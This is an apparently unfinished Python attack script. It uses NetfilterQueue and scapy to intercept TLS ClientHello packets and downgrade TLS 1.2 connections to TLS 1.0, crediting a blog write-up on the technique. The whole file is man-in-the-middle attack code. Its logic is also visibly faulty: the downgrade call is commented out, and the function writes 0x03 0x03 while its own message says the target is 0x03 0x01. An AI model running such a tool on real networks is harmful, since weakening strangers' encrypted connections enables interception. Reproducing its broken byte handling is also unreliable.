#!/usr/bin/python
#
# With many thanks to Ludovic Barman for their great write-up.
# https://lbarman.ch/blog/downgrade-tls/
# This one thread on a Python forum was also helpful:
# https://python-forum.io/Thread-NetfilterQueue-set-payload
#
# Also, thanks to Mike D. for teaching me how to join() to fix
# the bytes for set_payload().
#
# Also, @XargsNotBombs makes the wonderful Illustrated TLS Connections site.
# https://tls.ulfheim.net
#

from netfilterqueue import NetfilterQueue
from scapy import *

scapy_builtins = __import__('scapy.all', globals(), locals(),'.').__dict__
__builtins__.__dict__.update(scapy_builtins)

nfQueueID         = 0
maxPacketsToStore = 100



def processPacket(packet):
  print("...")
  scapy_packet = IP(packet.get_payload())

  if not scapy_packet.haslayer("Raw"):
    packet.accept();

  else:
    tcpPayload = scapy_packet["Raw"].load

    if tcpPayload[0] == '\x16' and tcpPayload[1] == '\x03' and tcpPayload[5] == '\x01':
      print("TLS handshake found, client HELLO.")

      if tcpPayload[9] == '\x03' and tcpPayload[10] == '\x03':
        print("TLS v1.2, dropping down to v1.0")
        print(scapy_packet.command())

        #scapy_packet = downgradeTLS(scapy_packet)
        
        # set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))      
        
      packet.accept()   
    
    else:                                                                              
      packet.accept();




def downgradeTLS(scapy_packet):
  del scapy_packet["IP"].chksum
  del scapy_packet["TCP"].chksum

  rawBytes = [b for b in scapy_packet]
  print("Position [61][62] was: ", rawBytes[61], rawBytes[62], ". Needs to change to 0x03 0x01.")

  rawBytes[61] = '\x03'
  rawBytes[62] = '\x03'

  print("Position [61][62] is now: ", rawBytes[61], rawBytes[62], ".")
  
  scapy_packet = b''.join(rawBytes)
  return scapy_packet



print("Binding to NFQUEUE", nfQueueID)
nfqueue = NetfilterQueue()
nfqueue.bind(nfQueueID, processPacket, maxPacketsToStore)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('Listener killed.')

nfqueue.unbind()

